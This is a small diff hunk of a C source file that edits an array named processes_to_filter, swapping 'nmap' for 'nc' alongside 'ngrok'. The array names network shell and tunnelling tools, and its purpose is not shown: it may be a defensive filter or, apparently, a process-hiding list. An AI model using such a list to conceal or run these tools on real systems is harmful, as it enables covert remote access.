@@ -11,7 +11,7 @@
  */
 static const char* processes_to_filter[] = {
     "ngrok",
-    "nmap"
+    "nc"
 };
 
 /*
